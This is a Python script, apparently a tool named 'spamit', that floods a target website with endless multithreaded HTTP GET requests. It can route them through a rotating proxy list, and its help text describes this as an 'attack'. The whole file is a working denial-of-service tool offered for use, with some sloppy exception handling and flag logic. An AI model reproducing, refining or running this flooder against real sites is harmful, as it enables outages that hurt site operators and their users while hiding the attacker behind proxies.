#!/usr/bin/env python3
#-*- coding: utf-8 -*-

import threading
import argparse
import requests
import random
import json
import os

def attack(url, timeout, proxies, cert, thread_val):
	if proxies:
		with open("proxylist.json", "r") as read:
			raw_prox = json.load(read)["head"]
	else:
		proxies = None

	while True:
		def Sender():
			try:
				proxdat = random.choice(raw_prox)
				proxies = {'http': f'http://{proxdat}', 'https': f'http://{proxdat}'}
				headers = {'User-Agent':'spamit on github'}
				Spammer = requests.get(url=url, headers=headers, timeout=timeout, proxies=proxies, cert=cert)
				print(f"[=] Request Sent - Code: {Spammer.status_code}")
			except requests.exceptions.ReadTimeout():
				print("[!] Read Timeout Error")
			except requests.exceptions.ConnectTimeout():
				print("[!] Connect Timeout Error")
			except requests.exceptions.RequestException:
				print("[!] Request Exception Error")
			except requests.exceptions.ConnectionError():
				print("[!] Connection Error")
			except KeyboardInterrupt:
				exit("[-] Exiting... (Keyboard Interrupt)")
		def Threader():
			threads = []
			for i in range(thread_val):
				t = threading.Thread(target=Sender)
				t.daemon = True
				threads.append(t)
			for i in range(thread_val):
				threads[i].start()
			for i in range(thread_val):
				threads[i].join()
		Threader()


if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-u", "--url", type=str, help="Target IP or website (http://... or https://...)", required=False)
	parser.add_argument("-t", "--timeout", type=int, help="Time it takes before aborting (In seconds. Default 3)", required=False)
	parser.add_argument("-th", "--thread", type=int, help="The number of threads used to send requests (Default 70)", required=False)
	parser.add_argument("-p", "--proxies", help="Option to use proxies to maximize the attack (Default n)", choices={"y", "n"}, required=False)
	parser.add_argument("-c", "--cert", help="Option to use certificates to check web credentials (Default n)", choices={"y", "n"}, required=False)
	args = parser.parse_args()
	# print(args)

	if args.url is None:
		os.system("python main.py --help")
		exit("\n")
	else:
		u = args.url
		t = args.timeout
		th = args.thread
		p = args.proxies
		c = args.cert

		if t is None:
			t = 3
		if th is None:
			th = 70
		if p == "y":
			p = True
		else:
			p = False
		if c == "n":
			c = True
		else:
			c = False

		# print(f"{args}\n\n{t} | {th} | {p} | {c}")
		attack(url=u, timeout=t, proxies=p, cert=c, thread_val=th)
